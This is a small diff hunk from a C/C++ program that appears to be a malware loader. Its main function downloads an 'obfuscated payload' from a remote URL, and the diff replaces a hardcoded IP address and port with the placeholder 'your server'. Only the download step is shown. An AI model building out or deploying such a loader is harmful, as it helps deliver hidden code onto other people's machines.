@@ -149,7 +149,7 @@ int main(int argc, char* argv[]) {
     useless_function();
 
     // URL of the remote payload
-    const wchar_t* url = L"http://43.139.62.116:8007/1.txt";
+    const wchar_t* url = L"your server";
     size_t payload_size = 0;
     unsigned char* obfuscated_payload = download_payload(url, &payload_size);
 
